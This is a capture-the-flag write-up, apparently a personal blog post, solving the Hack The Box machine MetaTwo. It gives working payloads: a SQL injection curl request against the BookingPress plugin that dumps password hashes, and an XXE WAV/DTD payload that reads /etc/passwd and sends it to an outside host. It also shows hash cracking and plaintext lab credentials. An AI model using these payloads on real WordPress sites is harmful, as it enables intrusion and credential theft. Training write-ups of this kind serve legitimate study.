---
title: "HTB MetaTwo"
date: 2026-05-16 19:37 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Linux, Easy]
image: /assets/img/posts/metatwo/metatwo.png
---

## Reconnaissance
### Scanning
- Nmap (All ports)
```
nmap -p- 10.129.228.95 --min-rate 1000 -nv
```
```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```
- NSE Scripts & Version
```
nmap -sCV -p21,22,80 10.129.228.95 --min-rate 1000 -nv
```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp?
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp open  http    nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://metapress.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- /etc/hosts
```
sudo nano /etc/hosts #10.129.228.95    metapress.htb
```
## Wordpress
### wordpress version
```
MetaTwo wpscan --update
wpscan --url http://metapress.htb/
wpscan --url http://metapress.htb/ --api-token XXXXXXXXXXXXX
...
WordPress version 5.6.2 identified (Insecure, released on 2021-02-22)
```
### plugins
```
<script data-cfasync="false" src='http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_element.js?ver=1.0.10' id='bookingpress_element_js-js'></script>
```
There is an exploit for this plugin: BookingPress < 1.0.11 – Unauthenticated SQL Injection.
```
➜  MetaTwo curl -s -q 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=f8b5bc45c9&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' | jq .
[
  {
    "bookingpress_service_id": "10.5.15-MariaDB-0+deb11u1",
    "bookingpress_category_id": "Debian 11",
    "bookingpress_service_name": "debian-linux-gnu",
    "bookingpress_service_price": "$1.00",
    "bookingpress_service_duration_val": "2",
    "bookingpress_service_duration_unit": "3",
    "bookingpress_service_description": "4",
    "bookingpress_service_position": "5",
    "bookingpress_servicedate_created": "6",
    "service_price_without_currency": 1,
    "img_url": "http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg"
  }
]
```
![wp1](/assets/img/posts/metatwo/wp1.png)
```
➜  MetaTwo curl -s -q 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=f8b5bc45c9&category_id=33&total_service=-7502) UNION ALL SELECT user_login,user_pass,@@version_compile_os,1,2,3,4,5,6 from wp_users-- -' | jq .
[
  {
    "bookingpress_service_id": "admin",
    "bookingpress_category_id": "$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.",
    "bookingpress_service_name": "debian-linux-gnu",
    "bookingpress_service_price": "$1.00",
    "bookingpress_service_duration_val": "2",
    "bookingpress_service_duration_unit": "3",
    "bookingpress_service_description": "4",
    "bookingpress_service_position": "5",
    "bookingpress_servicedate_created": "6",
    "service_price_without_currency": 1,
    "img_url": "http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg"
  },
  {
    "bookingpress_service_id": "manager",
    "bookingpress_category_id": "$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70",
    "bookingpress_service_name": "debian-linux-gnu",
    "bookingpress_service_price": "$1.00",
    "bookingpress_service_duration_val": "2",
    "bookingpress_service_duration_unit": "3",
    "bookingpress_service_description": "4",
    "bookingpress_service_position": "5",
    "bookingpress_servicedate_created": "6",
    "service_price_without_currency": 1,
    "img_url": "http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg"
  }
]
```
### Hashcat 
```
admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
```
```
hashcat -a 0 hash.txt rockyou.txt -d 1 -O --user
```
```
hashcat -a 0 hash.txt rockyou.txt -d 1 -O --user --show
manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar
```
![wp2](/assets/img/posts/metatwo/wp2.png)
### version exploit
Based on our findings and the version of WordPress in use, it appears to be vulnerable to the WordPress 5.6–5.7 authenticated XXE within the Media Library affecting PHP 8.
- PoC

>> Payload.wav

```
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % sp SYSTEM "http://10.10.14.186:9999/xxe.dtd">%sp;%param1;]><r>&exfil;</r>\x00' > payload.wav
```
>> xxe.dtd

```
cat > xxe.dtd << EOF
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.10.14.186:9999/?%data;'>">
EOF>
```
![wp3](/assets/img/posts/metatwo/wp3.png)
### system enum
- users
![wp4](/assets/img/posts/metatwo/wp4.png)

- `wp-config.php`
```php
define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );
```
## ftp
```
➜  MetaTwo ftp metapress.htb@ftp.metapress.htb
```
```
ftp> get send_email.php
```
```php
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;
```
## shell as jnelson
```
➜  MetaTwo ssh jnelson@metapress.htb
```
### passpie
```
jnelson@meta2:~$ ls -al
total 32
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25  2022 .
drwxr-xr-x 3 root    root    4096 Oct  5  2022 ..
lrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout
-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrc
drwxr-xr-x 3 jnelson jnelson 4096 Oct 25  2022 .local
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .passpie
-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profile
-rw-r----- 1 root    jnelson   33 May 16 18:11 user.txt
jnelson@meta2:~$ 
```
`Passpie` is a command line tool to manage passwords from the terminal with a colorful and configurable interface. Use a master passphrase to decrypt login credentials.
```
jnelson@meta2:~$ ls -al .passpie/
total 24
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25  2022 ..
-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keys
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25  2022 ssh
jnelson@meta2:~$ 
```
```
scp jnelson@metapress.htb:/home/jnelson/.passpie/.keys keys
```
```
-----BEGIN PGP PRIVATE KEY BLOCK-----
...
-----END PGP PRIVATE KEY BLOCK-----
```
### john
```
gpg2john private_key > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
...
blink182         (Passpie)
```
### root shell
![passpie](/assets/img/posts/metatwo/passpie.png)

```
passpie export /tmp/creds.txt
```
![passpie2](/assets/img/posts/metatwo/passpie2.png)
